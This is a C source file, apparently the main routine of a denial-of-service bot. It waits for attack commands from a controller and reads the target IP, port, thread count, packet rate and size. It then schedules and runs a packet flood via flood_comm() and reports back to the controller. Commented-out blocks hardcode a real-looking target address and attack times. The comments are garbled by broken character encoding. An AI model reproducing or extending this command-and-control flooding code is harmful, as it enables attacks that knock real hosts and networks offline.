#include "ctrl.h"
#include <time.h>

 char  source_ip[16];
 char local_ip[16];
extern  char att_ip[15];
char gate_mac[30];
struct command* cmd; 
extern int pid[CHLD_MAX];

int main(int argc,char *argv[])
{  
	 struct in_addr addr1;
	 time_t now,start,end;
	
 	getRequest(argc,argv,"att");//������:wait for attacking commands
	cmd=getCMD();
	printCMD(cmd);
/*	if(argc<5) return ;
	cmd=(struct command*)malloc(sizeof(struct command));
	cmd->att_ip=inet_addr("222.195.151.241");
	cmd->port=30000;
	cmd->threadnumber=4;
	cmd->type=atoi(argv[4]);
	cmd->rate=50000;
	cmd->pkt_size=1050;                              //���ñ��ι�����Ŀ�ĵ�ַ���˿ڡ��߳��������������͡������������Լ����ݰ��Ĵ�С����
	
	cmd->starttime.sec=atoi(argv[3]);
	cmd->starttime.min=atoi(argv[2]);
	cmd->starttime.hour=atoi(argv[1]);
	cmd->starttime.day=22;
	cmd->starttime.mon=3;
	cmd->starttime.year=2010;                     //���ù�������ʼʱ�䣪��

	cmd->endtime.sec=cmd->starttime.sec+20;
	cmd->endtime.min=cmd->starttime.min;
	cmd->endtime.hour=cmd->starttime.hour;
	cmd->endtime.day=cmd->starttime.day;
	cmd->endtime.mon=cmd->starttime.mon;
	cmd->endtime.year=cmd->starttime.year;        //���ù����Ľ���ʱ�䣪��
/*	cmd=(struct command*)malloc(sizeof(struct command));
	cmd->att_ip=inet_addr("222.195.151.241");
	cmd->port=1500;
	cmd->threadnumber=4;
	cmd->type=1;
	cmd->rate=50000;
	cmd->pkt_size=0;
	
	cmd->starttime.sec=0;
	cmd->starttime.min=7;
	cmd->starttime.hour=21;
	cmd->starttime.day=16;
	cmd->starttime.mon=3;
	cmd->starttime.year=2010;

	cmd->endtime.sec=cmd->starttime.sec+30;
	cmd->endtime.min=cmd->starttime.min;
	cmd->endtime.hour=cmd->starttime.hour;
	cmd->endtime.day=cmd->starttime.day;
	cmd->endtime.mon=cmd->starttime.mon;
	cmd->endtime.year=cmd->starttime.year;
	for(;cmd->type<5;cmd->type++,cmd->starttime.min++,cmd->endtime.min++)
  {*/
//	printCMD(cmd);
 
  memcpy(&addr1, &(cmd->att_ip), 4);                 //��cmd->att_ip��ֵ��addr1**
    getlocalip(local_ip);                            //��ȡ���ص�ַ����
    memcpy(att_ip,(char *)inet_ntoa(addr1),15);      //����ַaddr1����att_ip,���к���inet_ntoa(addr1)��һ������ֵ������ʾ�ĵ�ַaddr1ת�����ԡ�.�� ��������硰a.b.c.d�����ַ�����ʽ������
                                                     // ע��inet_ntoa()���ص��ַ��������WINDOWS�׽ӿ�ʵ����������ڴ��С�����
   get_dest_mac(local_ip,att_ip,gate_mac);           //��ȡĿ�ĵ�ַIP����
   
  
   start=switchtime(cmd->starttime);                 //������Ŀ�ʼʱ�丳ֵ���Ŷ���Ľṹ�����start**
   end=switchtime(cmd->endtime);                     //������Ŀ�ʼʱ�丳ֵ���Ŷ���Ľṹ�����end**
   now=time(NULL);                                   //��ȡ��ǰϵͳʱ�䣪��
 //  printf("%d   %d\n",(int)start,(int)now);          //����ʼʱ��͵�ǰʱ���������
   if(start<now)
   { printf("starttime has gone\n");
     return 0;
   }                          //�����ʼʱ��ȵ�ǰʱ��С�����㣪��
   while(start>now) {sleep(1);now++;}                //�����ʼʱ��ȵ�ǰʱ��������ͣһ�£���ǰʱ���1�룪��
    flood_comm();                                    //�������ݰ����й�������
    now=time(NULL);                                  //����֮���ȡһ��ϵͳʱ���Ա������һ���ıȽϣ���
    while(end>now) {sleep(1);now++;}                 //����ֹʱ����ڵ�ǰʱ��ʱ��ͣһ�£���ǰʱ���һ�룪��
	on_stop();                                   //ֹͣ��������
//  }
      send_to_ctrl();
     printf("goodbye\n");
   return 1;
}
